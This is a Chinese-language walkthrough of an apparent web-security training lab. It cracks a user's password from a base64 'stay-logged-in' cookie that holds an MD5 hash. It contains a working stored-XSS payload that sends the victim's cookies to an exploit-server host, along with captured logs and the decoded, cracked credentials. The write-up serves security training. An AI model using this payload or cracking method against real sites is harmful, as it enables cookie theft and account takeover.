# 实验：离线密码破解

本实验将用户的密码哈希存储在 cookie 中。本实验在评论功能中还包含一个 XSS 漏洞。为了解决本实验，请获取 Carlos 的 `stay-logged-in` cookie 并使用它来破解他的密码。然后，以 `carlos` 身份登录并从“我的账户”页面删除他的账户。

-   你的凭据：`wiener:peter`
-   受害者用户名：`carlos`

## 步骤

勾选记住我后使用登录功能
- 请求
    ```http
    POST /login HTTP/2

    username=wiener&password=peter&stay-logged-in=on
    ```

- 响应
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=wiener
    Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
    Set-Cookie: session=2g9pVpyMHq3EoQ1KSeG2YBu8ntf1H8Y6; Secure; HttpOnly; SameSite=None
    ```

- 对记住我功能进行解码
    `wiener:51dc30ddc473d43a6011e9ebba6ca770`
    - 使用 base64 编码
    - 后半为密码 peter 的 md5 哈希值


使用评论功能
- 探测评论字段 
    ```http
    POST /post/comment HTTP/2

    postId=1&comment=%3Ch3%3Etest%3C%2Fh3%3E&name=b&email=a%40b&website=
    ```
    - 设置 `<h3>test</h3>` 查看标签是否被解析

- 查看评论
    ```html
    <h3>
    test
    </h3>
    ```
    - 标签被解析为代码


构造 xss 载荷
- 载荷
    ```js
    <img src onerror="new Image().src = 'https://exploit-id.exploit-server.net/exploit?cookie=' + encodeURIComponent(document.cookie)">
    ```

- 查看 log 确认提取自己的 cookie 成功，同时看到模拟受害者的请求
    ```log
    10.0.4.231      2026-08-13 09:23:20 +0000 "GET /exploit?cookie=secret%3Djcl51EJ2em9d6aAe6oJqy8N8VDGTFRQh%3B%20stay-logged-in%3DY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ```
    - URL 解码后
        ```log
        secret=jcl51EJ2em9d6aAe6oJqy8N8VDGTFRQh; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
        ```
    - base64 解码后
        ```log
        carlos:26323c16d5f4dabff3bb136f2460a943
        ```

    - [网络搜索 md5 哈希](https://md5.gromweb.com/?md5=26323c16d5f4dabff3bb136f2460a943)
        - 得到 
            `onceuponatime`

使用凭据登录账户，执行删除功能
